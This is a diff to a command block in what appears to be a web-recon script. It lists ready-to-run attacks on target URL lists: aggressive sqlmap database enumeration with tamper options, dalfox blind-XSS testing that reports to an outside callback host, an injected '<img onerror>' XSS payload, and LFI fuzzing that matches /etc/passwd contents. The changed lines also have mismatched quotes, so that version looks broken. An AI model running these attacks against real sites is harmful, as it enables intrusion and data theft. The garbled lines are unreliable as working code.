@@ -1,20 +1,20 @@
 # Additional commands for manual execution
 # Run nuclei vulnerability scanner
-nuclei -l \"$fast_recon_dir/httpx.txt\" -o \"$fast_recon_dir/nuclei/nuclei.txt\"
+nuclei -l "reconDir/httpx.txt\" -o "reconDir/nuclei/nuclei.txt\"
 
 # Check for WAF protection
-wafw00f -i \"$fast_recon_dir/httpx.txt\" -o \"$fast_recon_dir/wafw00f.txt\"
+wafw00f -i "reconDir/httpx.txt\" -o "reconDir/wafw00f.txt\"
 
 # Run SQLMap on potential SQL injection points
-sqlmap -m \"$fast_recon_dir/gf-data/sqli.urls\" --level 5 --risk 3 --batch --random-agent --dbs --tamper=between
+sqlmap -m "reconDir/gf-data/sqli.urls\" --level 5 --risk 3 --batch --random-agent --dbs --tamper=between
 
 # XSS scanning with dalfox
-dalfox -b hahwul.xss.ht file \"$fast_recon_dir/gf-data/xss.urls\"
+dalfox -b hahwul.xss.ht file "reconDir/gf-data/xss.urls\"
 #XSS from  waynbackurls
-cat  "$fast_recon_dir/waybackurls.txt" | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | tee -a "$fast_recon_dir/vulns/freq_xss_output" | grep -iv "Not Vulnerable" | tee -a "$fast_recon_dir/vulns/freq_xss_findings"
+cat  "reconDir/waybackurls.txt" | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | tee -a "reconDir/vulns/freq_xss_output" | grep -iv "Not Vulnerable" | tee -a "reconDir/vulns/freq_xss_findings"
 
 # LFI testing
-cat \"$fast_recon_dir/gf-data/lfi.urls\" | qsreplace FUZZ | while read url ; do ffuf -u \$url -mr \"root:x\" -w /path/to/lfi-payloads.txt ; done"
+cat "reconDir/gf-data/lfi.urls\" | qsreplace FUZZ | while read url ; do ffuf -u \$url -mr \"root:x\" -w /path/to/lfi-payloads.txt ; done"
 
 
 #
